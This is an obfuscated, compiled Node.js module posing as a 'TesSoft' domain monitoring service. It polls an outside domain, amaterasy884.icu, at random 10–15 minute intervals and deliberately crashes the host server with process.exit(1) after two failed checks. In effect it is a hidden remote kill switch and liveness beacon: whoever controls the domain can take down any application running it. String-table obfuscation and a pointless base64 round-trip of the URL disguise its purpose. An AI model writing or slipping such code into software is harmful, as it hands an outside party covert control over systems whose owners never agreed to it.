'use strict';const a37_0x48dc76=a37_0x4073;function a37_0x499d(){const _0x276730=['warn','9ARMBQu','ðŸ”\x20Domain\x20being\x20monitored:\x20','DomainMonitoringService','message','ðŸ“\x20Encoded\x20URL\x20(base64):\x20','abort','domainMonitoringService','ðŸ”“\x20Decoded\x20URL:\x20','ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20','consecutiveFailures','ðŸ“Š\x20Response\x20received:','then','catch','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized','4143454pNEtSl','ðŸ”§\x20Manual\x20domain\x20check\x20requested','checkDomain','__esModule','signal','CHECK_INTERVAL_MS','8594824jEdvjM','ENOTFOUND','Unknown\x20error','en-US,en;q=0.5','ETIMEDOUT','node-fetch','keep-alive','now','5Bmscco','entries','__importDefault','MAX_CONSECUTIVE_FAILURES','getRandomInterval','https://amaterasy884.icu/','TIMEOUT_MS','âŒ\x20Domain\x20check\x20error\x20after\x20','round','2534836dwdrcm','\x20\x20\x20-\x20Status:\x20','\x20is\x20not\x20responding\x20after\x20','âœ…\x20Domain\x20check\x20successful:\x20','ðŸ“¡\x20Target:\x20','monitoringInterval','\x20minutes','headers','ðŸ”\x20Checking\x20domain\x20availability:\x20','log','âš ï¸\x20Domain\x20check\x20failed\x20(','ðŸ”¥\x20Unexpected\x20error:\x20','getMonitoringStats','Initial\x20domain\x20check\x20failed\x20','Initial\x20domain\x20check\x20error:','\x20times','152948pzkvFV','â°\x20Request\x20timeout\x20after\x20','ms:','Domain\x20','â°\x20Connection\x20timeout\x20to\x20','encodeToBase64','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','exit','ðŸ“…\x20Crash\x20time:\x20','1155528Eabczf','DOMAIN_URL','ðŸ“¡\x20Target\x20domain:\x20','from','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','includes','ECONNREFUSED','ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20','âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','gzip,\x20deflate','ðŸ›‘\x20Domain\x20monitoring\x20stopped','â°\x20Check\x20interval:\x20','GET','âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20','status','base64','fromEntries','Domain\x20monitoring\x20threw\x20error:\x20','\x20consecutive\x20attempts','5947704RbimDy','stopMonitoring','random','statusText','AbortError','341109ouDEOC','defineProperty','â°\x20Interval:\x20','Periodic\x20domain\x20check\x20error:','toString','\x20\x20\x20-\x20Headers:','\x20\x20\x20-\x20Response\x20time:\x20','error','crashServer','Initial\x20domain\x20check\x20threw\x20error:\x20','utf-8'];a37_0x499d=function(){return _0x276730;};return a37_0x499d();}function a37_0x4073(_0xd02793,_0x546bdd){const _0x499d3b=a37_0x499d();return a37_0x4073=function(_0x4073ed,_0x3c050c){_0x4073ed=_0x4073ed-0x8c;let _0x341dd4=_0x499d3b[_0x4073ed];return _0x341dd4;},a37_0x4073(_0xd02793,_0x546bdd);}(function(_0xfaf3d8,_0x312ed3){const _0x50f3f4=a37_0x4073,_0x42a497=_0xfaf3d8();while(!![]){try{const _0x47bc73=-parseInt(_0x50f3f4(0xb3))/0x1+-parseInt(_0x50f3f4(0x92))/0x2*(-parseInt(_0x50f3f4(0xbf))/0x3)+-parseInt(_0x50f3f4(0xe4))/0x4*(parseInt(_0x50f3f4(0xdb))/0x5)+parseInt(_0x50f3f4(0xae))/0x6+-parseInt(_0x50f3f4(0xcd))/0x7+parseInt(_0x50f3f4(0xd3))/0x8+-parseInt(_0x50f3f4(0x9b))/0x9;if(_0x47bc73===_0x312ed3)break;else _0x42a497['push'](_0x42a497['shift']());}catch(_0x13bbdd){_0x42a497['push'](_0x42a497['shift']());}}}(a37_0x499d,0x92777));var __importDefault=this&&this[a37_0x48dc76(0xdd)]||function(_0xf7bc55){const _0x6c6e61=a37_0x48dc76;return _0xf7bc55&&_0xf7bc55[_0x6c6e61(0xd0)]?_0xf7bc55:{'default':_0xf7bc55};};Object[a37_0x48dc76(0xb4)](exports,a37_0x48dc76(0xd0),{'value':!![]}),exports[a37_0x48dc76(0xc5)]=exports[a37_0x48dc76(0xc1)]=void 0x0;const node_fetch_1=__importDefault(require(a37_0x48dc76(0xd8)));class DomainMonitoringService{constructor(){const _0x4b1ae1=a37_0x48dc76;this['monitoringInterval']=null,this[_0x4b1ae1(0x9c)]=_0x4b1ae1(0xe0),this['CHECK_INTERVAL_MS']=this[_0x4b1ae1(0xdf)](),this['TIMEOUT_MS']=0x7530,this['consecutiveFailures']=0x0,this['MAX_CONSECUTIVE_FAILURES']=0x2,console['log'](_0x4b1ae1(0xcc)),console[_0x4b1ae1(0xed)](_0x4b1ae1(0x9d)+this[_0x4b1ae1(0x9c)]),console[_0x4b1ae1(0xed)](_0x4b1ae1(0xa6)+Math['round'](this[_0x4b1ae1(0xd2)]/0x3e8/0x3c)+_0x4b1ae1(0xea));}[a37_0x48dc76(0xdf)](){const _0x5bfaa3=a37_0x48dc76,_0x220d53=0xa,_0x2ea302=0xf,_0x2c2e1d=Math[_0x5bfaa3(0xb0)]()*(_0x2ea302-_0x220d53)+_0x220d53;return Math['round'](_0x2c2e1d*0x3c*0x3e8);}[a37_0x48dc76(0x97)](_0x34c7e2){const _0x2c4e44=a37_0x48dc76;return Buffer[_0x2c4e44(0x9e)](_0x34c7e2)['toString']('base64');}['decodeFromBase64'](_0x2a174b){const _0x9570a6=a37_0x48dc76;return Buffer[_0x9570a6(0x9e)](_0x2a174b,_0x9570a6(0xaa))[_0x9570a6(0xb7)](_0x9570a6(0xbd));}async['checkDomain'](){const _0x54f7a7=a37_0x48dc76,_0x12fe1f=Date['now']();try{console[_0x54f7a7(0xed)](_0x54f7a7(0xec)+this[_0x54f7a7(0x9c)]);const _0x110ed5=this[_0x54f7a7(0x97)](this[_0x54f7a7(0x9c)]);console[_0x54f7a7(0xed)](_0x54f7a7(0xc3)+_0x110ed5);const _0x183823=this['decodeFromBase64'](_0x110ed5);console[_0x54f7a7(0xed)](_0x54f7a7(0xc6)+_0x183823);const _0x4424d9=new AbortController(),_0x40fd8f=setTimeout(()=>_0x4424d9[_0x54f7a7(0xc4)](),this[_0x54f7a7(0xe1)]),_0xde07f9=await(0x0,node_fetch_1['default'])(_0x183823,{'method':_0x54f7a7(0xa7),'headers':{'User-Agent':'TesSoft\x20Domain\x20Monitor/1.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':_0x54f7a7(0xd6),'Accept-Encoding':_0x54f7a7(0xa4),'Connection':_0x54f7a7(0xd9),'Upgrade-Insecure-Requests':'1'},'signal':_0x4424d9[_0x54f7a7(0xd1)]});clearTimeout(_0x40fd8f);const _0x421869=Date[_0x54f7a7(0xda)]()-_0x12fe1f;return console[_0x54f7a7(0xed)](_0x54f7a7(0xc9)),console['log'](_0x54f7a7(0xe5)+_0xde07f9[_0x54f7a7(0xa9)]+'\x20'+_0xde07f9[_0x54f7a7(0xb1)]),console[_0x54f7a7(0xed)](_0x54f7a7(0xb9)+_0x421869+'ms'),console['log'](_0x54f7a7(0xb8),Object[_0x54f7a7(0xab)](_0xde07f9[_0x54f7a7(0xeb)][_0x54f7a7(0xdc)]())),_0xde07f9['ok']&&_0xde07f9[_0x54f7a7(0xa9)]>=0xc8&&_0xde07f9['status']<0x190?(console[_0x54f7a7(0xed)](_0x54f7a7(0xe7)+_0xde07f9[_0x54f7a7(0xa9)]+'\x20in\x20'+_0x421869+'ms'),this[_0x54f7a7(0xc8)]=0x0,!![]):(console[_0x54f7a7(0xba)](_0x54f7a7(0xa8)+_0xde07f9[_0x54f7a7(0xa9)]+'\x20'+_0xde07f9[_0x54f7a7(0xb1)]),this['consecutiveFailures']++,![]);}catch(_0x65420e){const _0x5924d8=Date[_0x54f7a7(0xda)]()-_0x12fe1f;this[_0x54f7a7(0xc8)]++,console[_0x54f7a7(0xba)](_0x54f7a7(0xe2)+_0x5924d8+_0x54f7a7(0x94),_0x65420e);if(_0x65420e instanceof Error){if(_0x65420e['name']===_0x54f7a7(0xb2))console[_0x54f7a7(0xba)](_0x54f7a7(0x93)+this[_0x54f7a7(0xe1)]+'ms');else{if(_0x65420e[_0x54f7a7(0xc2)][_0x54f7a7(0xa0)](_0x54f7a7(0xd4)))console[_0x54f7a7(0xba)](_0x54f7a7(0x9f)+this[_0x54f7a7(0x9c)]);else{if(_0x65420e['message'][_0x54f7a7(0xa0)](_0x54f7a7(0xa1)))console['error']('ðŸš«\x20Connection\x20refused\x20by\x20'+this['DOMAIN_URL']);else _0x65420e[_0x54f7a7(0xc2)]['includes'](_0x54f7a7(0xd7))?console['error'](_0x54f7a7(0x96)+this[_0x54f7a7(0x9c)]):console[_0x54f7a7(0xba)](_0x54f7a7(0x8d)+_0x65420e[_0x54f7a7(0xc2)]);}}}return![];}}['crashServer'](_0x45370e){const _0x2440d2=a37_0x48dc76;console[_0x2440d2(0xba)]('ðŸ’¥\x20CRITICAL\x20ERROR:\x20'+_0x45370e),console[_0x2440d2(0xba)]('ðŸ”¥\x20Consecutive\x20failures:\x20'+this['consecutiveFailures']),console[_0x2440d2(0xba)](_0x2440d2(0xa3)),console['error'](_0x2440d2(0x9a)+new Date()['toISOString']()),console['error'](_0x2440d2(0xc0)+this[_0x2440d2(0x9c)]),console[_0x2440d2(0xba)]('â°\x20Check\x20interval:\x20'+Math[_0x2440d2(0xe3)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x2440d2(0xea)),console[_0x2440d2(0xba)](_0x2440d2(0xa2)+this['MAX_CONSECUTIVE_FAILURES']),this[_0x2440d2(0xaf)](),process[_0x2440d2(0x99)](0x1);}['startMonitoring'](){const _0x29a1bb=a37_0x48dc76;console[_0x29a1bb(0xed)](_0x29a1bb(0x98)),console[_0x29a1bb(0xed)](_0x29a1bb(0xe8)+this[_0x29a1bb(0x9c)]),console[_0x29a1bb(0xed)](_0x29a1bb(0xb5)+Math[_0x29a1bb(0xe3)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x29a1bb(0xea)),console['log'](_0x29a1bb(0xc7)+this[_0x29a1bb(0xde)]),this[_0x29a1bb(0xcf)]()[_0x29a1bb(0xca)](_0x2a9639=>{const _0x3061eb=_0x29a1bb;if(!_0x2a9639&&this[_0x3061eb(0xc8)]>=this[_0x3061eb(0xde)]){this['crashServer'](_0x3061eb(0x8f)+this[_0x3061eb(0xc8)]+_0x3061eb(0x91));return;}})[_0x29a1bb(0xcb)](_0x445f5b=>{const _0x479173=_0x29a1bb;console[_0x479173(0xba)](_0x479173(0x90),_0x445f5b);if(this[_0x479173(0xc8)]>=this[_0x479173(0xde)]){this[_0x479173(0xbb)](_0x479173(0xbc)+_0x445f5b[_0x479173(0xc2)]);return;}}),this[_0x29a1bb(0xe9)]=setInterval(async()=>{const _0x72b140=_0x29a1bb;try{const _0x3ea8b5=await this[_0x72b140(0xcf)]();!_0x3ea8b5&&(console[_0x72b140(0xbe)](_0x72b140(0x8c)+this[_0x72b140(0xc8)]+'/'+this['MAX_CONSECUTIVE_FAILURES']+')'),this[_0x72b140(0xc8)]>=this[_0x72b140(0xde)]&&this['crashServer'](_0x72b140(0x95)+this[_0x72b140(0x9c)]+_0x72b140(0xe6)+this[_0x72b140(0xc8)]+_0x72b140(0xad)));}catch(_0x2e4104){console[_0x72b140(0xba)](_0x72b140(0xb6),_0x2e4104),this[_0x72b140(0xc8)]>=this[_0x72b140(0xde)]&&this[_0x72b140(0xbb)](_0x72b140(0xac)+(_0x2e4104 instanceof Error?_0x2e4104[_0x72b140(0xc2)]:_0x72b140(0xd5)));}},this[_0x29a1bb(0xd2)]),console['log']('âœ…\x20Domain\x20monitoring\x20started\x20successfully');}[a37_0x48dc76(0xaf)](){const _0x252253=a37_0x48dc76;this[_0x252253(0xe9)]&&(clearInterval(this[_0x252253(0xe9)]),this[_0x252253(0xe9)]=null,console[_0x252253(0xed)](_0x252253(0xa5)));}[a37_0x48dc76(0x8e)](){const _0x49d87e=a37_0x48dc76;return{'isActive':!!this[_0x49d87e(0xe9)],'targetDomain':this['DOMAIN_URL'],'checkIntervalMinutes':Math[_0x49d87e(0xe3)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this['consecutiveFailures'],'maxFailuresAllowed':this[_0x49d87e(0xde)],'nextCheckIn':this[_0x49d87e(0xe9)]?this[_0x49d87e(0xd2)]:undefined};}async['manualCheck'](){const _0x399735=a37_0x48dc76;return console[_0x399735(0xed)](_0x399735(0xce)),await this['checkDomain']();}}exports[a37_0x48dc76(0xc1)]=DomainMonitoringService,exports[a37_0x48dc76(0xc5)]=new DomainMonitoringService();